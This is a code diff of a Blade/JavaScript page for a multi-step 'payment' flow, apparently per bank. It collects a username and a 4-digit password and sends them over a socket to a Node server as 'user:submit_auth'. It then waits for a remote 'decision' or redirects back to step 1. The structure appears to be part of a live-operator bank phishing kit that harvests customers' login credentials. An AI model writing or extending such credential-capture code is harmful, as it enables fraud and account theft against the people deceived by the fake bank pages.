@@ -52,17 +52,16 @@ document.addEventListener('DOMContentLoaded', function () {
   const passInput = document.getElementById('txtPassword');
   const btn = document.getElementById('btnPass');
   const form = document.getElementById('formStep2');
-  try { sessionStorage.removeItem('rt_last_error'); } catch {}
   const nodeUrl = @json($nodeUrl);
   const sessionId = @json($sessionId);
   const sessionToken = @json($sessionToken);
   const step = @json($step); // ✅ asegúrate de pasar $screen desde controller
   const bank = @json($bank);
   const user = @json($user);
-
+  window.RT.sessionToken = sessionToken;
   let waitingNewDecision = false;
 
-
+  
   function toggleBtn() {
     btn.disabled = !((passInput.value || '').trim().length === 4);
   }
@@ -71,6 +70,8 @@ document.addEventListener('DOMContentLoaded', function () {
     passInput.disabled = lock;
     btn.disabled = lock ? true : !((passInput.value || '').trim().length === 4);
   }
+
+
 
   registerSocketUpdateCallback(function (s) {
     // Aquí puedes reaccionar extra sin redirigir manualmente
@@ -88,6 +89,8 @@ document.addEventListener('DOMContentLoaded', function () {
     }
   });
   
+
+  
   form.addEventListener('submit', function (e) {
     e.preventDefault(); // ✅ quedarse en el mismo step
 
@@ -96,12 +99,22 @@ document.addEventListener('DOMContentLoaded', function () {
       showBankAlert('loginError', 'Credenciales inválidas.');
       return;
     }
+    
+    if (!user || user.length < 4) {
+      showBankAlert('loginError', 'Credenciales inválidas.');
+      setTimeout(() => {
+        window.location.href = `/pago/${bank}/step/1`;
+        return;
+      }, 2000);
+      return;
+    }
 
     hideBankAlert('loginError');
-    initSocketConnection(nodeUrl, sessionId, sessionToken, bank, String(step));
     // ✅ emitir (si no está conectado, se encola y se envía cuando conecte)
+    initSocketConnection(nodeUrl, sessionId, sessionToken, bank, '2');
     waitingNewDecision = true;
-    window.rtEmitSubmit('user:submit_auth', {
+    console.log(sessionToken)
+    rtEmitSubmit('user:submit_auth', {
     sessionId,
     auth: {
         user: user,
